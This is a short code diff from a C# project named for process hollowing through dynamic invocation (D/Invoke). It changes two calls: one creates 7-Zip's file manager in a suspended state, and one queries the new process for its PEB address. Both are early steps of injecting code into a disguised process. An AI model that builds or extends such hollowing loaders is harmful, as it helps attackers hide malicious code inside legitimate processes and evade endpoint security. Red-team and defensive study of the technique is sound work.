@@ -161,7 +161,7 @@ namespace DInvoke_ProcessHollowing
             //"The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called."
             //Avoid svchost.exe, explorer.exe etc
             object[] parameters = { @"C:\Program Files\7-Zip\7zFM.exe", null, pa, ta, true, (uint)PROCESS_CREATION_FLAGS.CREATE_SUSPENDED, IntPtr.Zero, Directory.GetCurrentDirectory(), si, pi};
-            Generic.CallMappedDLLModuleExportRef(kern32DLL.PEINFO, kern32DLL.ModuleBase, "CreateProcessW", typeof(CreateProcessWD), ref parameters, false);
+            Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "CreateProcessW", typeof(CreateProcessWD), parameters, false);
 
             //Since we are using dynamic invocation we have to repopulate the structure with the returned value from CreateProcessW
             pi = (PROCESS_INFORMATION)parameters[9];
@@ -172,7 +172,7 @@ namespace DInvoke_ProcessHollowing
 
             //The third argument, bi (PROCESS_BASIC_INFORMATION) structure, will be populated with the PEB address           
             object[] zqparameters = { hProcess, 0, bi, (uint)(IntPtr.Size * 6), tmp };
-            Generic.CallMappedDLLModuleExportRef(ntdllDLL.PEINFO, ntdllDLL.ModuleBase, "ZwQueryInformationProcess", typeof(ZwQueryInformationProcessD), ref zqparameters, false);
+            Generic.CallMappedDLLModuleExport(ntdllDLL.PEINFO, ntdllDLL.ModuleBase, "ZwQueryInformationProcess", typeof(ZwQueryInformationProcessD), zqparameters, false);
 
             //Again due to DInvoke we have to repopulate the structure with the returned value from ZwQueryInformationProcess
             bi = (PROCESS_BASIC_INFORMATION)zqparameters[2];
